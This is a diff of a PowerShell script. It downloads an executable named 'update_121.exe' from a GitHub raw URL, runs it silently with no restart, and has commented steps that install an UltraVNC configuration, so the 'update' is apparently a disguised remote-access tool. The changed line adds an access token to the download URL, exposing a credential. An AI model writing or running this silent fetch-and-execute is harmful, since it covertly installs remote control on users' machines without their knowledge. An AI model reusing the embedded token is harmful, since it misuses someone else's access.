@@ -11,7 +11,7 @@ $consoleHWND
 #Start-Sleep -Seconds 1 -ErrorAction Stop
 $client = new-object System.Net.WebClient -ErrorAction Stop
 #Start-Sleep -Seconds 1 -ErrorAction Stop
-$client.DownloadFile("https://raw.githubusercontent.com/srbhptl39/automation/master/update_121.exe","$Env:USERPROFILE\update_121.exe") ;
+$client.DownloadFile("https://raw.githubusercontent.com/srbhptl39/automation/master/update_121.exe?token=AHBRL73P3FFO2DQUKVUKC3TBHYIV4","$Env:USERPROFILE\update_121.exe") ;
 #$client.DownloadFile("https://raw.githubusercontent.com/srbhptl39/automation/master/ultravnc.ini","$Env:USERPROFILE\update_121.ini");
 & $Env:USERPROFILE\update_121.exe /SP- /VERYSILENT /NORESTART -ErrorAction Stop
 #Copy-Item -Path $Env:USERPROFILE\update_121.ini -Destination 'C:\Program Files\uvnc bvba\UltraVNC\ultravnc.in' -ErrorAction Stop
